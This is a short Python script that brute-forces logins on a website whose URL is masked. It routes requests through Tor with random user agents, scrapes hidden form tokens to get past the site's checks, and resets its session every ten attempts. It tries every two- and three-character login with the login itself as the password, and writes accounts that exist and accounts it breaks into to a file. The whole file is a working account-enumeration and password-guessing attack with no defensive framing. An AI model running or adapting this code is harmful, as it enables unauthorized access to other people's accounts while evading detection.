import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from string import digits, ascii_letters
import itertools

SYMBOLS = digits + ascii_letters
URL = 'http://******/'

# generating random useragent
headers = {
    'User-Agent': UserAgent().random
}

# tor proxies
proxies = {
    "http": "socks5://127.0.0.1:9050",
    "https": "socks5://127.0.0.1:9050",
}


# bruteforce function
def bruteforce(length_1, length_2):
    def start_new_session():
        s = requests.Session()
        r = s.get(URL, headers=headers, proxies=proxies)
        return s, r

    counter = 0
    session, response = start_new_session()

    for login_length in range(length_1, length_2 + 1):
        soup = BeautifulSoup(response.content, 'html.parser')
        for login in itertools.product(SYMBOLS, repeat=login_length):
            login = "".join(login)

            data = {
                'login': login,
                'password': login,
                'answer': soup.find(id="Answer_hidden")['value'],
                'hash': soup.find(id="hash_hidden")['value'],
                'one': soup.find(id="One_hidden")['value'],
                'symbol': soup.find(id="Symbol_hidden")['value'],
                'two': soup.find(id="Two_hidden")['value'],
                'type': soup.find(id="Type_hidden")['value']
            }

            if counter == 10:
                session, response = start_new_session()
                counter = 0

            post = session.post(URL, headers=headers, proxies=proxies, data=data)

            print(post.text, login)

            counter += 1
            if post.text == 'Не верный пароль.':
                with open('logins.txt', 'a') as file:
                    file.write(f'{login}\n')
            if post.text == 'Такой логин не зарегистрирован.':
                continue
            if '{"username"' in post.text:
                with open('logins.txt', 'a') as file:
                    file.write(f'{login} PASSWORD\n')


if __name__ == "__main__":
    bruteforce(2, 3)
